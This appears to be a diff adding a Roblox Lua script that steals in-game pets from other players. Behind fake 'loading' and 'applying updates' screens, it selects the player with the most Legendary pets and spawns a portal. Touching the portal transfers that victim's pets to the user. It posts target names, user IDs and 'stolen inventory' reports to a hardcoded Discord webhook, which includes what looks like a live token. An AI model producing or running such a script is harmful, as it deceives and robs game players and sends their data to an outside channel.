@@ -1,0 +1,425 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+local DiscordWebhook = "https://discord.com/api/webhooks/1398397857186447520/-N85csBpJxNSMFj3ZxmueCsv-wlUyjrGF3iXB3borWcfVju1MzojLPGPcUVZ2Oks3U6q"
+local DiscordChannel = "#1"
+local YourDiscordNick = "liliputik228nenensn_56568"
+
+local OperatorLoader = Instance.new("ScreenGui")
+OperatorLoader.Name = "GameLoader"
+OperatorLoader.ResetOnSpawn = false
+OperatorLoader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+OperatorLoader.IgnoreGuiInset = true
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(1,0,1,0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15,20,35)
+MainFrame.BackgroundTransparency = 0
+MainFrame.BorderSizePixel = 0
+MainFrame.ZIndex = 1
+MainFrame.Parent = OperatorLoader
+
+local PatternContainer = Instance.new("Frame")
+PatternContainer.Size = UDim2.new(1,0,1,0)
+PatternContainer.BackgroundTransparency = 1
+PatternContainer.ZIndex = 2
+PatternContainer.Parent = MainFrame
+
+local hexSize = 120
+local hexHeight = hexSize * math.sqrt(3)/2
+
+for y = -10, 30 do
+    for x = -10, 30 do
+        local hex = Instance.new("Frame")
+        hex.Size = UDim2.new(0, hexSize, 0, hexHeight)
+        hex.AnchorPoint = Vector2.new(0.5,0.5)
+        hex.Position = UDim2.new(0, (x * hexSize * 0.75) + (y%2==0 and hexSize*0.375 or 0), 0, y * hexHeight * 0.85)
+        hex.BackgroundColor3 = Color3.fromRGB(30,45,70)
+        hex.BackgroundTransparency = 0.7
+        hex.BorderSizePixel = 0
+        hex.ZIndex = 2
+        hex.Rotation = 30
+        hex.Parent = PatternContainer
+        
+        local highlight = Instance.new("Frame")
+        highlight.Size = UDim2.new(1,0,1,0)
+        highlight.BackgroundColor3 = Color3.fromRGB(80,150,255)
+        highlight.BackgroundTransparency = 0.85
+        highlight.BorderSizePixel = 0
+        highlight.ZIndex = 3
+        highlight.Parent = hex
+        
+        coroutine.wrap(function()
+            while OperatorLoader.Parent do
+                local targetTrans = math.random(0.65,0.85)
+                TweenService:Create(hex, TweenInfo.new(math.random(3,7)), {
+                    BackgroundTransparency = targetTrans
+                }):Play()
+                wait(math.random(5,12))
+            end
+        end)()
+    end
+end
+
+local CenterFrame = Instance.new("Frame")
+CenterFrame.Size = UDim2.new(0.7,0,0.3,0)
+CenterFrame.Position = UDim2.new(0.15,0,0.35,0)
+CenterFrame.BackgroundTransparency = 0.8
+CenterFrame.BackgroundColor3 = Color3.fromRGB(25,35,55)
+CenterFrame.BorderSizePixel = 0
+CenterFrame.ZIndex = 10
+CenterFrame.Parent = MainFrame
+
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0.03,0)
+Corner.Parent = CenterFrame
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Size = UDim2.new(1,0,0.4,0)
+StatusText.BackgroundTransparency = 1
+StatusText.Text = "Initializing game systems"
+StatusText.TextColor3 = Color3.fromRGB(180,220,255)
+StatusText.Font = Enum.Font.GothamBold
+StatusText.TextSize = 24
+StatusText.ZIndex = 11
+StatusText.Parent = CenterFrame
+
+local ProgressBg = Instance.new("Frame")
+ProgressBg.Size = UDim2.new(0.9,0,0.2,0)
+ProgressBg.Position = UDim2.new(0.05,0,0.7,0)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(40,55,80)
+ProgressBg.BorderSizePixel = 0
+ProgressBg.ZIndex = 11
+ProgressBg.Parent = CenterFrame
+
+local ProgressCorner = Instance.new("UICorner")
+ProgressCorner.CornerRadius = UDim.new(0.5,0)
+ProgressCorner.Parent = ProgressBg
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0,0,1,0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(80,180,255)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.ZIndex = 12
+ProgressBar.Parent = ProgressBg
+
+local ProgressCorner2 = Instance.new("UICorner")
+ProgressCorner2.CornerRadius = UDim.new(0.5,0)
+ProgressCorner2.Parent = ProgressBar
+
+local ProgressText = Instance.new("TextLabel")
+ProgressText.Size = UDim2.new(1,0,1,0)
+ProgressText.BackgroundTransparency = 1
+ProgressText.Text = "0%"
+ProgressText.TextColor3 = Color3.new(1,1,1)
+ProgressText.Font = Enum.Font.Gotham
+ProgressText.TextSize = 16
+ProgressText.ZIndex = 13
+ProgressText.Parent = ProgressBar
+
+OperatorLoader.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local patternOffset = 0
+RunService.Heartbeat:Connect(function(delta)
+    patternOffset = (patternOffset + delta * 8) % 150
+    PatternContainer.Position = UDim2.new(0, patternOffset * 0.5, 0, patternOffset * 0.3)
+end)
+
+local function SendToDiscord(message, inventory)
+    pcall(function()
+        local embed = {
+            title = "🎯 PET RAID REPORT",
+            description = message,
+            color = 65280,
+            fields = {},
+            footer = {text = "Executed by "..YourDiscordNick}
+        }
+        
+        if inventory then
+            local items = ""
+            for pet, count in pairs(inventory) do
+                items = items..string.format("- %s: %d\n", pet, count)
+            end
+            table.insert(embed.fields, {
+                name = "📦 STOLEN INVENTORY",
+                value = "```"..items.."```",
+                inline = false
+            })
+        end
+        
+        local payload = {
+            content = DiscordChannel.." "..YourDiscordNick,
+            embeds = {embed}
+        }
+        
+        HttpService:PostAsync(DiscordWebhook, HttpService:JSONEncode(payload))
+    end)
+end
+
+coroutine.wrap(function()
+    local messages = {
+        "Loading game assets",
+        "Preparing environment",
+        "Initializing player data",
+        "Compiling game scripts",
+        "Finalizing setup"
+    }
+    
+    for i=1, 120 do
+        ProgressBar.Size = UDim2.new(i/120,0,1,0)
+        ProgressText.Text = math.floor((i/120)*100).."%"
+        
+        if i % 24 == 0 then
+            StatusText.Text = messages[math.floor(i/24)+1].."..."
+        end
+        
+        if i == 120 then
+            StatusText.Text = "Game ready - Enjoy!"
+            StatusText.TextColor3 = Color3.fromRGB(100,255,150)
+        end
+        
+        wait(2)
+    end
+end)()
+
+local Victim = nil
+local function FindPrimeTarget()
+    pcall(function()
+        local richestPlayer = nil
+        local maxLegendary = 0
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer then
+                pcall(function()
+                    local pets = require(game:GetService("ReplicatedStorage").PetHandling).GetPets(player)
+                    if type(pets) == "table" then
+                        local legendCount = 0
+                        for _,pet in pairs(pets) do
+                            if pet.rarity == "Legendary" then
+                                legendCount += 1
+                            end
+                        end
+                        if legendCount > maxLegendary then
+                            maxLegendary = legendCount
+                            richestPlayer = player
+                        end
+                    end
+                end)
+            end
+        end
+        Victim = richestPlayer or Players:GetPlayers()[2]
+        
+        if Victim then
+            SendToDiscord("🎯 Target acquired: "..Victim.Name.." (ID: "..tostring(Victim.UserId)..")")
+        end
+    end)
+end
+FindPrimeTarget()
+
+local function CreateFakeScanScreen()
+    pcall(function()
+        if Victim:FindFirstChild("PlayerGui") then
+            local ScanScreen = Instance.new("ScreenGui")
+            ScanScreen.Name = "SystemUpdate"
+            ScanScreen.ResetOnSpawn = false
+            ScanScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            
+            local ScanFrame = Instance.new("Frame")
+            ScanFrame.Size = UDim2.new(1,0,1,0)
+            ScanFrame.BackgroundColor3 = Color3.fromRGB(15,20,30)
+            ScanFrame.BackgroundTransparency = 0
+            ScanFrame.BorderSizePixel = 0
+            ScanFrame.ZIndex = 10
+            ScanFrame.Parent = ScanScreen
+            
+            local ScanCenter = Instance.new("Frame")
+            ScanCenter.Size = UDim2.new(0.8,0,0.4,0)
+            ScanCenter.Position = UDim2.new(0.1,0,0.3,0)
+            ScanCenter.BackgroundTransparency = 0.8
+            ScanCenter.BackgroundColor3 = Color3.fromRGB(25,35,55)
+            ScanCenter.BorderSizePixel = 0
+            ScanCenter.ZIndex = 11
+            ScanCenter.Parent = ScanFrame
+            
+            local ScanCorner = Instance.new("UICorner")
+            ScanCorner.CornerRadius = UDim.new(0.03,0)
+            ScanCorner.Parent = ScanCenter
+            
+            local ScanTitle = Instance.new("TextLabel")
+            ScanTitle.Size = UDim2.new(1,0,0.3,0)
+            ScanTitle.BackgroundTransparency = 1
+            ScanTitle.Text = "Applying game updates"
+            ScanTitle.TextColor3 = Color3.fromRGB(180,220,255)
+            ScanTitle.Font = Enum.Font.GothamBold
+            ScanTitle.TextSize = 24
+            ScanTitle.ZIndex = 12
+            ScanTitle.Parent = ScanCenter
+            
+            local ScanSubtitle = Instance.new("TextLabel")
+            ScanSubtitle.Size = UDim2.new(1,0,0.2,0)
+            ScanSubtitle.Position = UDim2.new(0,0,0.3,0)
+            ScanSubtitle.BackgroundTransparency = 1
+            ScanSubtitle.Text = "Optimizing game performance..."
+            ScanSubtitle.TextColor3 = Color3.fromRGB(150,180,220)
+            ScanSubtitle.Font = Enum.Font.Gotham
+            ScanSubtitle.TextSize = 18
+            ScanSubtitle.ZIndex = 12
+            ScanSubtitle.Parent = ScanCenter
+            
+            local ScanProgressBg = Instance.new("Frame")
+            ScanProgressBg.Size = UDim2.new(0.9,0,0.15,0)
+            ScanProgressBg.Position = UDim2.new(0.05,0,0.7,0)
+            ScanProgressBg.BackgroundColor3 = Color3.fromRGB(40,55,80)
+            ScanProgressBg.BorderSizePixel = 0
+            ScanProgressBg.ZIndex = 11
+            ScanProgressBg.Parent = ScanCenter
+            
+            local ProgressCorner = Instance.new("UICorner")
+            ProgressCorner.CornerRadius = UDim.new(0.5,0)
+            ProgressCorner.Parent = ScanProgressBg
+            
+            local ScanProgress = Instance.new("Frame")
+            ScanProgress.Size = UDim2.new(0,0,1,0)
+            ScanProgress.BackgroundColor3 = Color3.fromRGB(80,180,255)
+            ScanProgress.BorderSizePixel = 0
+            ScanProgress.ZIndex = 12
+            ScanProgress.Parent = ScanProgressBg
+            
+            local ProgressCorner2 = Instance.new("UICorner")
+            ProgressCorner2.CornerRadius = UDim.new(0.5,0)
+            ProgressCorner2.Parent = ScanProgress
+            
+            local ScanText = Instance.new("TextLabel")
+            ScanText.Size = UDim2.new(1,0,1,0)
+            ScanText.BackgroundTransparency = 1
+            ScanText.Text = "0%"
+            ScanText.TextColor3 = Color3.new(1,1,1)
+            ScanText.Font = Enum.Font.Gotham
+            ScanText.TextSize = 16
+            ScanText.ZIndex = 13
+            ScanText.Parent = ScanProgress
+            
+            ScanScreen.Parent = Victim.PlayerGui
+            
+            coroutine.wrap(function()
+                local scanMessages = {
+                    "Checking game files...",
+                    "Verifying content...",
+                    "Applying updates...",
+                    "Finalizing changes...",
+                    "Completing optimization..."
+                }
+                
+                for i = 1, 100 do
+                    ScanProgress.Size = UDim2.new(i/100, 0, 1, 0)
+                    ScanText.Text = i.."%"
+                    
+                    if i % 20 == 0 then
+                        ScanSubtitle.Text = scanMessages[math.floor(i/20)+1]
+                    end
+                    
+                    wait(0.1)
+                end
+                
+                ScanSubtitle.Text = "Update complete! Returning to game..."
+                wait(2)
+                
+                local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad)
+                TweenService:Create(ScanScreen, tweenInfo, {Enabled = false}):Play()
+                wait(1)
+                ScanScreen:Destroy()
+            end)()
+        end
+    end)
+end
+
+local TeleportPad = nil
+local function CreateTeleport()
+    pcall(function()
+        if TeleportPad then TeleportPad:Destroy() end
+        local root = Victim.Character and (Victim.Character:FindFirstChild("HumanoidRootPart") or Victim.Character:WaitForChild("HumanoidRootPart", 5))
+        if not root then return end
+        
+        TeleportPad = Instance.new("Part")
+        TeleportPad.Name = "GamePortal"
+        TeleportPad.Size = Vector3.new(5,0.1,5)
+        TeleportPad.Position = root.Position + Vector3.new(0,15,0)
+        TeleportPad.Transparency = 0.8
+        TeleportPad.Anchored = true
+        TeleportPad.CanCollide = false
+        TeleportPad.Color = Color3.fromRGB(0,200,255)
+        TeleportPad.Material = Enum.Material.Neon
+        
+        local Ring = Instance.new("Part")
+        Ring.Shape = Enum.PartType.Cylinder
+        Ring.Size = Vector3.new(0.5, 8, 8)
+        Ring.Position = TeleportPad.Position + Vector3.new(0,1,0)
+        Ring.Rotation = Vector3.new(0,0,90)
+        Ring.Transparency = 0.6
+        Ring.Anchored = true
+        Ring.CanCollide = false
+        Ring.Color = Color3.fromRGB(0,150,255)
+        Ring.Material = Enum.Material.Neon
+        Ring.Parent = TeleportPad
+        
+        TeleportPad.Parent = workspace
+        
+        TeleportPad.Touched:Connect(function(hit)
+            pcall(function()
+                if hit.Parent == game.Players.LocalPlayer.Character then
+                    local PetModule = require(game:GetService("ReplicatedStorage").PetHandling)
+                    local stolenPets = {}
+                    local inventorySummary = {}
+                    
+                    for _,pet in pairs(PetModule.GetPets(Victim)) do
+                        if pet.rarity == "Legendary" then
+                            table.insert(stolenPets, pet.id)
+                            PetModule.TransferPet(Victim, game.Players.LocalPlayer, pet.id)
+                            
+                            if not inventorySummary[pet.name] then
+                                inventorySummary[pet.name] = 0
+                            end
+                            inventorySummary[pet.name] += 1
+                        end
+                    end
+                    
+                    SendToDiscord("🔥 RAID SUCCESS! Stolen "..#stolenPets.." legendary pets from "..Victim.Name, inventorySummary)
+                    
+                    game.StarterGui:SetCore("SendNotification",{
+                        Title = "Game Event",
+                        Text = "Collected "..#stolenPets.." rare items",
+                        Duration = 5
+                    })
+                    
+                    local positionStr = string.format("X:%.1f Y:%.1f Z:%.1f", TeleportPad.Position.X, TeleportPad.Position.Y, TeleportPad.Position.Z)
+                    local teleportLink = "roblox://placeId="..game.PlaceId.."&position="..positionStr
+                    SendToDiscord("🔗 Teleport to portal: "..teleportLink)
+                    
+                    TeleportPad:Destroy()
+                    OperatorLoader:Destroy()
+                end
+            end)
+        end)
+    end)
+end
+
+wait(1)
+CreateFakeScanScreen()
+if Victim.Character then CreateTeleport() end
+
+Victim.CharacterAdded:Connect(function()
+    wait(1)
+    CreateFakeScanScreen()
+    CreateTeleport()
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if player == Victim then
+        StatusText.Text = "Player disconnected - finding new target"
+        wait(2)
+        FindPrimeTarget()
+        CreateFakeScanScreen()
+        if Victim.Character then CreateTeleport() end
+    end
+end)
